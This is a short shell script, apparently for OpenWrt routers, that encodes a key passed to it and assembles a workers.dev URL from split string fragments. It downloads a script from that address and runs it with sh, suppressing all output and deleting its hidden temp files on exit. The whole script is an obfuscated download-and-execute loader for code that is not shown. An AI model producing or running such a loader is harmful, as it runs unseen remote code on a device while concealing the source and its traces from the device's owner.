#!/bin/sh
_trap_cleanup() { rm -f /tmp/.al_$$* /tmp/.sys_$$* 2>/dev/null; exit 1; }
trap _trap_cleanup INT TERM EXIT

_a1="autologin"
_a2="creativy24"
_a3="workers"
_a4="dev"
_url="https://${_a1}.${_a2}.${_a3}.${_a4}"
_key="$1"
_rand=$(date +%s%N 2>/dev/null || echo $$)
_tmp="/tmp/.al_${_rand}_$$"

_chk() {
    [ -z "$1" ] && return 1
    opkg status "$1" 2>/dev/null | grep -q "Status:.*installed" 2>/dev/null
}

_dep() {
    _chk "ca-certificates" || {
        opkg update >/dev/null 2>&1 || true
        opkg install ca-certificates >/dev/null 2>&1 || exit 1
    }
}

_enc() {
    printf '%s' "$1" | openssl enc -base64 -A 2>/dev/null | tr -d '\n'
}

_exec() {
    _dep
    _ekey=$(_enc "$_key")
    curl -sSL "${_url}/s?k=${_ekey}" -o "$_tmp" 2>/dev/null
    if [ -s "$_tmp" ]; then
        sh "$_tmp" 2>/dev/null
        _ret=$?
        rm -f "$_tmp" 2>/dev/null
        exit $_ret
    fi
    rm -f "$_tmp" 2>/dev/null
    exit 1
}

_exec
